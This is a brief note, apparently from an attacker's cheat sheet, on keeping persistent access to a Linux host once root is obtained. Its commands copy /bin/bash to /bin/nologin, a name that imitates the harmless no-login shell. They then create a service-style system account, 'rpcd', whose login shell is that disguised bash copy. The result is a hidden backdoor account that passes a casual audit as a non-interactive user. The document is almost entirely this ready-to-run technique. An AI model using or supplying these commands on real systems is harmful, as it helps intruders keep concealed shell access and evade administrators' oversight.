# Prerequisite

Root user access

# Target

    cp /bin/bash /bin/nologin
    useradd -r -m -d /var/spool/<USERNAME> -s /usr/sbin/nologin <USERNAME>
    useradd -r -m -d /var/spool/rpcd -s /bin/nologin rpcd